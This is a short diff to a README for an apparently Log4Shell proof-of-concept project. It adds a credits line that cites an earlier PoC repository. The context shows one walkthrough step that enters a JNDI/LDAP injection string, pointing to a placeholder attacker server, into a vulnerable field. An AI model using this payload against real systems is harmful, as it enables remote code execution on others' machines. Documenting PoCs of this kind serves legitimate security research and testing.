@@ -42,3 +42,6 @@ format lookups and preventing further exploitation of this attack
 
    3.1 enter `${jndi:ldap://<IP_OF_LDAP_SERVER_FROM_STEP_2>:1389/a}` into a vulnerable field (such as user name)
 
+
+## Credits
+The initial repo and inspiration for this work is based on the work of [tangxiaofeng7/apache-log4j-poc](https://github.com/tangxiaofeng7/apache-log4j-poc)
